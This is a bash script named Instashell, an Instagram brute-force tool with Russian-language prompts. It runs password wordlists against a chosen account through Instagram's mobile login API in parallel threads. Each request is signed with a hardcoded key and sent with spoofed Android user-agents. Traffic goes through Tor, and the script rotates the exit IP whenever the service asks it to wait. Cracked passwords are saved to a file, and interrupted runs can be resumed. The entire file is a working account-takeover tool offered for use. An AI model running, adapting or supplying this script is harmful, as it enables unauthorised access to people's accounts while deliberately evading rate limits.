#!/bin/bash
# Coded by: github.com/thelinuxchoice
# Instagram: @thelinuxchoice

trap 'store;exit 1' 2
string4=$(openssl rand -hex 32 | cut -c 1-4)
string8=$(openssl rand -hex 32  | cut -c 1-8)
string12=$(openssl rand -hex 32 | cut -c 1-12)
string16=$(openssl rand -hex 32 | cut -c 1-16)
device="android-$string16"
uuid=$(openssl rand -hex 32 | cut -c 1-32)
phone="$string8-$string4-$string4-$string4-$string12"
guid="$string8-$string4-$string4-$string4-$string12"
var=$(curl -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null)
var2=$(echo $var | awk -F ';' '{print $2}' | cut -d '=' -f3)

checkroot() {
if [[ "$(id -u)" -ne 0 ]]; then
    printf "\e[1;77mЗапускайте скрипт от имени супер пользователя!\n\e[0m"
    exit 1
fi
}

dependencies() {

command -v tor > /dev/null 2>&1 || { echo -en >&2 "Мне нужен \033[41m\033[30mtor\033[0m, но его нет, используй ./installreq.sh. Выход."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo -en >&2 "Мне нужен \033[41m\033[30mcurl\033[0m, но его нет, используй ./installreq.sh. Выход."; exit 1; }
command -v openssl > /dev/null 2>&1 || { echo -en >&2 "Мне нужен \033[41m\033[30mopenssl\033[0m, но его нет, используй ./installreq.sh. Выход."; exit 1; }

command -v awk > /dev/null 2>&1 || { echo -en >&2 "Мне нужен \033[41m\033[30mawk\033[0m. Выход."; exit 1; }
command -v sed > /dev/null 2>&1 || { echo -en >&2 "Мне нужен \033[41m\033[30msed\033[0m. Выход."; exit 1; }
command -v cat > /dev/null 2>&1 || { echo -en >&2 "Мне нужен \033[41m\033[30mcat\033[0m. Выход."; exit 1; }
command -v tr > /dev/null 2>&1 || { echo -en >&2 "Мне нужен \033[41m\033[30mtr\033[0m. Выход."; exit 1; }
command -v wc > /dev/null 2>&1 || { echo -en >&2 "Мне нужен \033[41m\033[30mwc\033[0m. Выход."; exit 1; }
command -v cut > /dev/null 2>&1 || { echo -en >&2 "Мне нужен \033[41m\033[30mcut\033[0m. Выход."; exit 1; }
command -v uniq > /dev/null 2>&1 || { echo -en >&2 "Мне нужен \033[41m\033[30muniq\033[0m. Выход."; exit 1; }
if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
    echo -en "\033[41m\033[30m/dev/urandom\033[0m не найден!"
    exit 1
fi

}

banner() {

printf "\e[1;92m     _                                   _             _  _           \e[0m\n"
printf "\e[1;92m _  | |                _                | |           | || |          \e[0m\n"
printf "\e[1;92m( \ | | ____    ___  _| |_  _____   ___ | |__   _____ | || |          \e[0m\n"
printf "\e[1;92m ) )| ||  _ \  /___)(_   _)(____ | /___)|  _ \ | ___ || || |          \e[0m\n"
printf "\e[1;77m(_/ | || | | ||___ |  | |_ / ___ ||___ || | | || ____|| || |  _____   \e[0m\n"
printf "\e[1;77m    |_||_| |_|(___/    \__)\_____|(___/ |_| |_||_____) \_)\_)(_____)  \e[0m\n"
printf "\n"
printf "\e[1;77m\e[45m  Instagram Brute Forcer v1.5.3 Author: thelinuxchoice (Github/IG)   \e[0m\n"
printf "\e[1;77m\e[45m            RU by XI_shArky_IX (github.com/XIshArkIX)                \e[0m\n"
printf "\n"
}

function start() {
banner
checkroot
dependencies
read -p $'\e[1;92mИмя аккаунта: \e[0m' user
checkaccount=$(curl -s https://www.instagram.com/$user/?__a=1 | grep -c "страница возможно удалена или не сущетсвует по каким-либо причинам")
if [[ "$checkaccount" == 1 ]]; then
printf "\e[1;91mНеправильное имя аккаунта, попробуй ещё раз.\e[0m\n"
sleep 1
start
else
default_wl_pass="passwords.lst"
read -p $'\e[1;92mСловарь (или Enter для использования стандартного): \e[0m' wl_pass
wl_pass="${wl_pass:-${default_wl_pass}}"
default_threads="10"
read -p $'\e[1;92mПотоки (Используйте <20 или Enter, чтобы использовать 10): \e[0m' threads
threads="${threads:-${default_threads}}"
fi
}

checktor() {

check=$(curl --socks5-hostname localhost:9050 -s https://check.torproject.org > /dev/null; echo $?)

if [[ "$check" -gt 0 ]]; then
printf "\e\033[0;33m[!][1;91m Пожалуйста, проверте соединение с TOR! Просто напишите \033[0;32mtor\033[0m или \033[0;32mservice tor start\n\e[0m\033[0m"
exit 1
fi

}

function store() {

if [[ -n "$threads" ]]; then
printf "\e[1;91m [*] Остановка всех потоков...\n\e[0m"
if [[ "$threads" -gt 10 ]]; then
sleep 6
else
sleep 3
fi
default_session="Y"
printf "\n\e[1;77mСохранить сессию для пользователя\e[0m\e[1;92m %s \e[0m" $user
read -p $'\e[1;77m? [Д/н]: \e[0m' session
session="${session:-${default_session}}"
if [[ "$session" == "Y" || "$session" == "y" || "$session" == "yes" || "$session" == "Yes" || "$session" == "Да" || "$session" == "Д" || "$session" == "да" || "$session" == "д" ]]; then
if [[ ! -d sessions ]]; then
mkdir sessions
fi
printf "user=\"%s\"\npass=\"%s\"\nwl_pass=\"%s\"\ntoken=\"%s\"\n" $user $pass $wl_pass $token > sessions/store.session.$user.$(date +"%FT%H%M")
printf "\e[1;77mСессия сохранена.\e[0m\n"
printf "\e[1;92mИспользуйте ./instashell --resume\n\033[0m"
else
exit 1
fi
else
exit 1
fi
}


function changeip() {

killall -HUP tor

}

function bruteforcer() {

checktor
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
printf "\e[1;92mИмя пользователя:\e[0m\e[1;77m %s\e[0m\n" $user
printf "\e[1;92mСловарь:\e[0m\e[1;77m %s (%s)\e[0m\n" $wl_pass $count_pass
printf "\e[1;91m[*] Нажмите Ctrl + C, чтобы остановить или сохранить сессию\n\e[0m"
token=0
startline=1
endline="$threads"
while [ $token -lt $count_pass ]; do
IFS=$'\n'
for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "ru-RU", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; ru_RU)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"

countpass=$(grep -n "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

let token++
printf "\e[1;77mПробую (%s/%s)\e[0m: %s\n" $token $count_pass $pass

{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; ru_RU)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait"| uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Найден пароль: %s\n [*] Запрошено испытание\n" $pass; printf "Имя пользователя: %s, Пароль: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Сохранено:\e[0m\e[1;77m found.instashell \n\e[0m";  kill -1 $$ ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Найден пароль: %s\n" $pass; printf "Имя пользователя: %s, Пароль: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Сохранено:\e[0m\e[1;77m found.instashell \n\e[0m"; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then changeip; fi; ) } & done; wait $!;

let startline+=$threads
let endline+=$threads
changeip
done
}



function resume() {

banner
checktor
counter=1
if [[ ! -d sessions ]]; then
printf "\e[1;91m[*] Ни сохранено не одной сессии\n\e[0m"
exit 1
fi
printf "\e[1;92mФайлы сессий:\n\e[0m"
for list in $(ls sessions/store.session*); do
IFS=$'\n'
source $list
printf "\e[1;92m%s \e[0m\e[1;77m: %s (\e[0m\e[1;92mwl:\e[0m\e[1;77m %s\e[0m\e[1;92m,\e[0m\e[1;92m lastpass:\e[0m\e[1;77m %s )\n\e[0m" "$counter" "$list" "$wl_pass" "$pass"
let counter++
done
read -p $'\e[1;92mВыберите номер сессии: \e[0m' fileresume
source $(ls sessions/store.session* | sed ''$fileresume'q;d')
default_threads=10
read -p $'\e[1;92mПотоки (Используйте <20 или Enter, чтобы использовать 10): \e[0m' threads
threads="${threads:-${default_threads}}"

printf "\e[1;92m[*] Продолжаю сессию для:\e[0m \e[1;77m%s\e[0m\n" $user
printf "\e[1;92m[*] Словарь: \e[0m \e[1;77m%s\e[0m\n" $wl_pass
printf "\e[1;91m[*] Нажмите Ctrl + C, чтобы остановить или сохранить сессию\n\e[0m"


count_pass=$(wc -l $wl_pass | cut -d " " -f1)

while [ $token -lt $count_pass ]; do
IFS=$'\n'
for pass in $(sed -n '/\b'$pass'\b/,'$(($token+threads))'p' $wl_pass); do

header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "ru-RU", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; ru_RU)"'

data='{"phone_id":"$phone", "_csrftoken":"$var2", "username":"'$user'", "guid":"$guid", "device_id":"$device", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"

countpass=$(grep -n -w "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
printf "\e[1;77mПробую (%s/%s)\e[0m: %s\n" $token $count_pass $pass
let token++
{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; ru_RU)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait"| uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Найден пароль: %s\n [*] Запрошено испытание\n" $pass; printf "Имя пользователя: %s, Пароль: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Сохранено:\e[0m\e[1;77m found.instashell \n\e[0m";  kill -1 $$ ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Найден пароль: %s\n" $pass; printf "Имя пользователя: %s, Пароль: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Сохранено:\e[0m\e[1;77m found.instashell \n\e[0m"; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then changeip; fi; ) } & done; wait $!;

changeip
done
exit 1
}

case "$1" in --resume) resume ;; *)
start
bruteforcer
esac
